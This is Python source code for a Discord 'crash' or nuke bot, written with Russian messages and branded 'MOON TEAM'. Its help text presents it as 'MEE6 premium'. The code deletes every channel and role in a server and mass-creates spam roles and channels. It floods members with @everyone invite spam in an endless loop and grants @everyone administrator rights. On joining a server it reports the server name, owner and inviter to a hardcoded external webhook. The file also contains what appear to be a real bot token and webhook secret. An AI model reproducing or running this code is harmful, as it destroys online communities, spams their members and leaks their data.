import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import os
import json
import requests
from discord import Webhook, AsyncWebhookAdapter
import discord, random, aiohttp, asyncio
from threading import Thread
from keep_alive import keep_alive
keep_alive()
black_list = json.load(open('black-list.json'))
bl_server = json.load(open('bl-server.json'))
ser_vers = json.load(open('servers.json'))
prefix = '!'
spam_message = '@everyone **Сервер крашнут.**\n`Заходи к нам`, *_если хочешь так же_*: https://discord.gg/je6U2t9xkQ'
spam_role_name = "crash by moon"
spam_channel_name = 'crash by moon'
intents = discord.Intents.all()
client = commands.Bot(prefix, intents=discord.Intents.all())
client.remove_command( 'help' )
async def chs(guild):
    for u in guild.channels:  # Удаление каналов
        try: await u.delete()
        except: pass
    for u in guild.roles:
        try: await u.delete()
        except: pass

async def rls(guild):
    for yi in range(1, 501):
        try: await guild.create_role(name=spam_role_name, colour=discord.Colour.from_rgb(0, 0, 1))
        except: pass
        try: await guild.create_text_channel(spam_channel_name)
        except: pass

@client.event
async def on_guild_join(guild):
  if guild.id in ser_vers:
        embed = discord.Embed(
            title = 'Попытка краша сервера из белого списка.',
            description = '''Согласно нашим данным это сервер пытались крашнуть. Мы советуем посмотреть журнал аудита и проверить кто пригласил этого бота. Если у вас есть вопросы, то **[🔗кликните наш Discord сервер](https://discord.gg/6SE3CcGQdx)**''',
            color = 0xe90000
        )
        await guild.text_channels[0].send(embed=embed)
        await guild.leave()
  adder=None
  try:
    async for entry in guild.audit_logs(action=discord.AuditLogAction.bot_add):
      adder = entry.user
      a_id=adder.id
      break
    if a_id in black_list:
      try: await adder.send("https://discord.gg/c2P7kn6Edc ", embed = discord.Embed(title=':x:Доступ запрещен. Вас добавили в черный список', description=f'```Вы можете зайти на сервер, чтобы узнать причину блокировки```', colour = 0xf00a0a))
      except: pass
      await guild.leave()
      return
  except: adder="Unknown"; a_id="Unknown"
  async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url('https://discord.com/api/webhooks/970665225642729542/KeOL5FPfSJjitYlP2vMhFF48ZwqJS9lG_Et99ToTzEE_YoSwotdaoQUHQpi01lFvZZ9k', adapter=discord.AsyncWebhookAdapter(session))
        members = len(guild.members)
        await webhook.send(embed=discord.Embed(
            title="Новый сервер!",
            description=(
                f"**Название перед крашем:** `{guild.name}`\n"
                f"**Добавил краш бота:** <@{a_id}> **Его айди** `{a_id}` \n"
                f"**Инфо перед крашем:**\n"
                f"**Участников:** `{guild.member_count}`\n"
                f"**Ролей:** `{str(len(guild.roles))}` \n"
                f"**Каналов:** `{str(len(guild.channels))}` \n"
                f"**Владелец:** `{guild.owner}` **Его айди:** `{guild.owner.id}`\n"
                f"**ID сервера:** `{guild.id}`\n"
                f"**Пригласить бота:** `Ссылка` [Нажмите для добавления](https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot) **Бот в этом канале** <#969584822567731220>\n"
                f"**Уничтожено серверов этим ботом:** `{len(client.guilds)}` \n"
                f"**Все сервера отображаются | jktimosha**"
            ),
            color=discord.Color.blue()
        ).set_thumbnail(url=guild.icon_url_as(static_format="png", size=1024)))



@client.event
async def on_ready():
    print(f'Бот запущен. Ник бота: {client.user}  https://discord.com/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot Юзеров {0}!'.format(client.user))
    await client.change_presence(status=discord.Status.online, activity=discord.Streaming(name=f'!hhelp | MOON TEAM', url='https://www.twitch.tv/jktimosha'))


@client.event
async def on_guild_channel_create(channel):
    if channel.name == "crash by moon":
        webhook = await channel.create_webhook(name = "Crash by MOON")
        webhook_url = webhook.url
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
            while True:
                try: 
                    await webhook.send('@everyone @here\n МЫ ПЕРЕЕЗЖАЕМ, НОВЫЙ СЕРВЕР- https://discord.gg/je6U2t9xkQ 🙈', username='gg')
                except:
                    pass

@client.command()
async def nuke(guild):
    await roles(guild)
    await channels(guild)

@client.event
async def on_command_error(ctx, err):
    if isinstance(err, commands.errors.BotMissingPermissions):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"У бота отсутствуют права: {' '.join(err.missing_perms)}\nВыдайте их ему для полного функционирования бота", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance(err, commands.CommandOnCooldown):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"**У вас еще не прошел кулдаун на команду** `{ctx.command}`\n**Подождите еще** \n  ```{err.retry_after:.2f} секунд```", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance(err, commands.CommandNotFound ):
        await ctx.send(embed = discord.Embed(description = f'** {ctx.author.name}, данной команды не существует.**', color=0x0c0c0c))
    elif isinstance( err, commands.MissingRequiredArgument ):
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"Нету аргумента", color=discord.Colour.from_rgb(255, 0, 0)))
@client.command()
@commands.cooldown(1, 30, commands.BucketType.user)
async def roles(ctx):
    for g in ctx.guild.roles:
        try:
            await g.delete()
        except:
            pass
    while(50):
        try:
            await ctx.guild.create_role(name=spam_role_name, colour=discord.Colour.from_rgb(0, 0, 1))
        except:
            return


@client.command()
@commands.cooldown(1, 30, commands.BucketType.user)
async def channels(ctx):
    try:
        for i in ctx.guild.channels:
            try:
                await i.delete()
            except:
                pass
        for timer in range(100):
            await ctx.guild.create_text_channel(spam_channel_name)
            await ctx.guild.create_voice_channel(spam_channel_name)
    except:
        pass

@client.command()
async def hhelp(ctx):
    await ctx.message.delete()
    try:
        await ctx.author.send(embed = discord.Embed(title='Команды MEE6 premium', description=f'`{prefix}nuke`  - **Автоматический краш сервера(все сразу)** \n `{prefix}roles`  - **Удаление ролей и спам ими** \n `{prefix}channels`  - **Удаление каналов и спам ими**', colour = 0xf00a0a))
    except:
        await ctx.send('Открой лс')

@client.command(brief = "private", description = "Создаёт приглашение, и отправляет его")
async def invite(ctx=None, id=None):
  g = client.get_guild(int(id))
  if not g: return await ctx.send('Сервер не найден')
  for x in g.text_channels:
      link = await x.create_invite(max_age=20, max_uses=10)
      link = str(link)
      await ctx.send(link)
      return link
      await ctx.send(f'Нет прав для создания инвайта ')

@client.command(pass_context=True)
async def everyone_admin(ctx):
    role = discord.utils.get(ctx.message.guild.roles, name = "@everyone")
    perms = discord.Permissions(administrator = True)
    await role.edit(permissions = perms)
    await ctx.message.delete()
    embed = discord.Embed(
        title = 'Успешная выдача роли администратора.',
        description = f'''{ctx.author} роли @everyone было выдано право администратора! Теперь все участники могут приглашать ботов, вносить изменения в сервер.''',
        color = 0xf70000
    )
    await ctx.author.send(embed=embed)
    
token = ("OTczOTY3ODEwODAxODUyNDc2.GCbwgc.G-5mJ-jstzGu4EqNo0yw-gwnVAMHMWhJonBVMw")
client.run(token)